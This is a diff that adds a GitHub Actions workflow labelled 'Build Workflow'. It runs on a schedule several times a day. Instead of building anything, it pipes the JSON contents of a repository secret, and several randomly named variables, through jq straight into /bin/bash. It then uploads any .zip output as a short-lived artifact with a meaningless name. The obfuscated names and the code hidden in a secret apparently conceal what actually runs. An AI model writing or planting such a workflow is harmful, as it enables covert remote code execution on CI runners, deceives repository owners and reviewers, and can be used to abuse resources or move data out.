@@ -1,0 +1,33 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '56 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          jl189: ${{ secrets.jl189 }}
+        run: |
+          printf '%s' "$jl189" | jq -r .v586 | /bin/bash
+          printf '%s' "$ejcp0098" | jq -r .ulsah641 | /bin/bash
+          echo $qxe549 | jq -r .ltw7 | /bin/bash
+          echo $nlba909 | jq -r .n79 | /bin/bash
+          echo $c545 | jq -r .isv684 | /bin/bash
+          echo $byvkk04793 | jq -r .yl3972 | /bin/bash
+          echo $omghx4278 | jq -r .y950 | /bin/bash
+          printf '%s' "$h4" | jq -r .yibe84 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Oecyidux
+          path: "*.zip"
+          retention-days: 1
